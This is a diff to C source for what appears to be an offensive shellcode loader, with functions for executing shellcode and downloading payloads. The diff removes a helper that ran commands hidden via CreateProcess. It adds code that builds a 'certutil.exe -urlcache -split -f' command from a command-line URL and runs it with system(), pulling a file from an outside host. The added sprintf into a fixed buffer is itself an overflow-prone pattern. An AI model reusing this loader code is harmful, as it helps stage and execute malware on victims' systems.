@@ -55,9 +55,6 @@ void exec_shellcode_ASCIIMSF(unsigned char *shellcode);
 #ifdef DOWNLOADEXECSC
 unsigned char* downloadshellcode(char* uri);
 #endif
-#if defined(DOWNLOADCERTUTIL) || defined(DOWNLOADPOWERSHELL)
-int windows_system(const char *cmd);
-#endif
 
 int main (int argc, char **argv)
 {
@@ -98,7 +95,12 @@ int main (int argc, char **argv)
 //#if defined(DOWNLOADCERTUTIL) || defined(DOWNLOADPOWERSHELL)
 //download a file and write to disk
 #ifdef DOWNLOADCERTUTIL
-	windows_system(argv[1]);
+	char download[500];  //how not to do it...
+	sprintf(download,"certutil.exe -urlcache -split -f %s",argv[2]);
+	#ifdef PRINT_DEBUG
+		printf("url: %s\n", download);
+	#endif
+	system(download);
 #endif
 
 	#ifdef LVALUE
@@ -518,28 +520,4 @@ char* ie_download(char* string, char* sh_filename)
 }
 #endif
 
-#if defined(DOWNLOADCERTUTIL) || defined(DOWNLOADPOWERSHELL)
-//exec cmd commands hidden
-//https://stackoverflow.com/questions/1597289/hide-console-in-c-system-function-win
-int windows_system(const char *cmd)
-{
-	PROCESS_INFORMATION p_info;
-	STARTUPINFO s_info;
-	LPSTR cmdline, programpath;
-
-	memset(&s_info, 0, sizeof(s_info));
-	memset(&p_info, 0, sizeof(p_info));
-	s_info.cb = sizeof(s_info);
-
-	cmdline     = _tcsdup(TEXT(cmd));
-	//programpath = _tcsdup(TEXT(cmd));
-
-	if (CreateProcess(NULL, cmdline, NULL, NULL, 0, 0, NULL, NULL, &s_info, &p_info))
-	{
-		WaitForSingleObject(p_info.hProcess, INFINITE);
-		CloseHandle(p_info.hProcess);
-		CloseHandle(p_info.hThread);
-	}
-}
-#endif
 
